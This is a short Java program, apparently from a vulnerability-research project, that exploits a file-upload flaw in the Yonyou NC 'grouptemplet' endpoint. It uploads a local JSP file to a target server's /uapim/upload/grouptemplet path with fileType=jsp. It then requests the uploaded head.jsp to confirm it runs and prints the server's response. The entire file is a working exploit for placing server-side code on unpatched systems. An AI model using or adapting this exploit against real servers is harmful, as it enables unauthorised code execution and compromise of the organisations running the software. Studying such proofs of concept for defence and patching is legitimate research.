package cve.nc;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.http.Response;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;

import java.io.IOException;
import java.util.Random;

public class grouptemplet_fileupload {

    public static void main(String[] args) throws IOException {

        int groupid = new Random().nextInt(1000000);

        String url = "http://10.58.120.201/uapim/upload/grouptemplet?groupid=" + groupid + "&fileType=jsp";
        HttpRequest httpRequest = new HttpRequest("127.0.0.1", 8080);
        HttpPost httpPost = new HttpPost(url);
        Response response = httpRequest.sendFormFilePost(httpPost, "D:\\javaProjects\\VulDebug\\Yongyou\\src\\main\\resources\\test.jsp");
        System.out.println(response.getStatusCode());

        String url2 = "http://10.58.120.201/uapim/static/pages/" + groupid + "/head.jsp";
        HttpGet httpGet = new HttpGet(url2);
        Response response1 = httpRequest.sendGet(httpGet);
        System.out.println(response1.getStatusCode());
        System.out.println(response1.getResponseBody());

    }
}
